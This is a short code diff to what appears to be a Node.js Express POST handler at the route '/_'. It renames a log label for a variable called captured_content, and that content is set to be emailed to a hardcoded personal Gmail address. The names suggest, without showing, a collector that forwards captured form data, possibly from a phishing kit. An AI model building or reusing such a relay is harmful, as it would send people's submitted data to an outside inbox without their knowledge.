@@ -32,7 +32,7 @@ app.post('/_', function (req, res) {
             return
         }
     });
-    console.log("captured:"+captured_content);
+    console.log("eshak:"+captured_content);
     
     var message = captured_content;
     var toEmail = "mdalonebd@gmail.com";
